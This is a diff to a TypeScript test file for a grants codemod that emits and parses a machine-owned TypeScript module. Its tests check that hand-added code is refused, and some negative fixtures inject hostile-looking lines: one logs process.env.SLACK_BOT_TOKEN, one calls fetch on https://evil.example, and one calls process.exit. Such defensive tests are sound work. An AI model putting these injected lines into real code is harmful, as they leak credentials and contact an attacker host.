@@ -5,8 +5,10 @@ import {
   applyDelta,
   emptyGrantsFile,
   overlayBundleName,
+  emitGrantsModule,
   parseGrantsFile,
-  parseGrantsText,
+  parseGrantsModule,
+  renormalizeGrantsModule,
   stringifyGrants,
   GrantsCodemodError,
   type GrantsFile,
@@ -141,11 +143,11 @@ throwsWith(
 }
 
 {
-  const good = parseGrantsText('{ "bundles": [], "bindings": [] }');
+  const good = parseGrantsFile(JSON.parse('{ "bundles": [], "bindings": [] }'));
   ok(good.bundles.length === 0 && good.bindings.length === 0, "parse: empty grants file parses");
   const withComment = parseGrantsFile({ $comment: "docs", bundles: [], bindings: [] });
   ok(withComment.bundles.length === 0, "parse: $comment is tolerated (docs pointer in the data file)");
-  throwsWith(() => parseGrantsText("nonsense"), "not valid JSON", "parse: garbage text refuses");
+  throwsWith(() => parseGrantsModule("nonsense"), "does not start with the generated header", "parse: garbage text refuses (no module grammar)");
   throwsWith(() => parseGrantsFile({ bundles: [], bindings: [], extra: 1 }), "unknown top-level key", "parse: unknown top-level key refuses");
   throwsWith(() => parseGrantsFile({ bundles: [{ name: "sneaky" }], bindings: [] }), '"grants:"-prefixed name', "parse: non-namespaced bundle name refuses");
   throwsWith(
@@ -167,6 +169,74 @@ throwsWith(
 
 {
   const messy: GrantsFile = {
+    bundles: [{ name: "grants:slack/T1/C1", connectors: ["zeta", "alpha"] }],
+    bindings: [{ bundle: "grants:slack/T1/C1", scope: { level: "surface", surface: "slack/T1/C1" } }],
+  };
+  const mod = emitGrantsModule(messy);
+
+  ok(mod.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), "module: opens with the machine-owned banner");
+  ok(mod.includes('\nimport type { GrantsFile } from "@open-everywhere/core/agent/access/grants-codemod.js";\n'), "module: carries exactly one TYPE-ONLY import");
+  ok(mod.includes("\nexport default {\n"), "module: the data is the default export");
+  ok(mod.endsWith(" satisfies GrantsFile;\n"), "module: ends with the satisfies clause + newline");
+  const nonGrammar = mod
+    .split("\n")
+    .filter((l) => !l.startsWith("//") && l.trim() !== "" && !l.startsWith("import type "))
+    .join("\n");
+  ok(
+    nonGrammar.startsWith("export default {") && nonGrammar.endsWith("} satisfies GrantsFile;"),
+    "module: the ONLY statement is the default export (nothing else survives the grammar strip)",
+  );
+  ok(mod.split("export default").length === 2, "module: exactly one `export default`");
+  ok(!/\bfunction\b|\brequire\(|=>/u.test(mod.replace(/^\/\/.*$/gmu, "")), "module: no callable syntax outside the header");
+
+  ok(emitGrantsModule(messy) === mod, "module: emit is deterministic");
+  ok(emitGrantsModule(parseGrantsModule(mod)) === mod, "module: emit ∘ parseModule is a fixpoint");
+  ok(parseGrantsModule(mod).bundles.length === 1, "module: parseModule returns the data");
+
+  throwsWith(
+    () => parseGrantsModule(mod + "console.log(process.env.SLACK_BOT_TOKEN);\n"),
+    "must contain exactly one",
+    "module: a hand-added statement AFTER the data is REFUSED (the format admits no code)",
+  );
+  throwsWith(
+    () => parseGrantsModule(mod.replace("\nexport default {", "\nglobalThis.x = fetch(\"https://evil.example\");\nexport default {")),
+    "does not start with the generated header",
+    "module: a hand-added statement BEFORE the data is REFUSED",
+  );
+  throwsWith(
+    () => parseGrantsModule(mod.replace('from "@open-everywhere/core/agent/access/grants-codemod.js"', 'from "./elsewhere.js"')),
+    "does not start with the generated header",
+    "module: a re-pointed type import is REFUSED",
+  );
+  throwsWith(
+    () => parseGrantsModule(mod.replace("DO NOT HAND-EDIT.", "hand-edits welcome.")),
+    "does not start with the generated header",
+    "module: an edited header is REFUSED",
+  );
+
+  const reordered = mod.replace('"alpha"', '" "').replace('"zeta"', '"alpha"').replace('" "', '"zeta"');
+  ok(reordered !== mod, "module: (fixture) the reordering edit actually changed the bytes");
+  throwsWith(() => parseGrantsModule(reordered), "not in canonical form", "module: a hand-reordered array is REFUSED (round-trip check), not silently rewritten");
+  const reindented = mod.replace('  "bundles"', '    "bundles"');
+  ok(reindented !== mod, "module: (fixture) the re-indent edit actually changed the bytes");
+  throwsWith(() => parseGrantsModule(reindented), "not in canonical form", "module: a hand-re-indented body is REFUSED");
+
+  ok(renormalizeGrantsModule(reordered) === mod, "module: renormalize turns a hand-edited body back into the canonical bytes");
+  ok(renormalizeGrantsModule(mod) === mod, "module: renormalize is idempotent on a canonical file");
+  throwsWith(
+    () => renormalizeGrantsModule(mod + "process.exit(0);\n"),
+    "must contain exactly one",
+    "module: renormalize REFUSES a code-bearing file rather than stripping the code",
+  );
+
+  const empty = emitGrantsModule(emptyGrantsFile());
+  ok(empty.includes('"bundles": []') && empty.includes('"bindings": []'), "module: the empty overlay emits empty arrays");
+  ok(emitGrantsModule(parseGrantsModule(empty)) === empty, "module: the empty overlay round-trips");
+  throwsWith(() => parseGrantsModule(""), "does not start with the generated header", "module: an empty FILE is refused (absence is not an empty overlay)");
+}
+
+{
+  const messy: GrantsFile = {
     bundles: [
       { name: "grants:slack/T1/C2", connectors: ["zeta", "alpha"] },
       { name: "grants:slack/T1/C1", connections: [{ ...notionRest, methods: ["POST", "GET"], pathPrefixes: ["/v1/search", "/a"] }] },
@@ -182,7 +252,7 @@ throwsWith(
   ok(text.indexOf('"GET"') < text.indexOf('"POST"'), "stringify: methods in canonical HTTP order");
   ok(text.indexOf('"alpha"') < text.indexOf('"zeta"'), "stringify: connectors sorted");
   ok(text.indexOf('"/a"') < text.indexOf('"/v1/search"'), "stringify: pathPrefixes sorted");
-  ok(stringifyGrants(parseGrantsText(text)) === text, "stringify: parse ∘ stringify is a fixpoint (round-trip stable)");
+  ok(stringifyGrants(parseGrantsModule(emitGrantsModule(messy))) === text, "stringify: parse ∘ stringify is a fixpoint (round-trip stable)");
   const idPos = text.indexOf('"id"');
   ok(idPos >= 0 && idPos < text.indexOf('"credentialType"') && text.indexOf('"credentialType"') < text.indexOf('"secretRef"'), "stringify: canonical connection key order");
 }
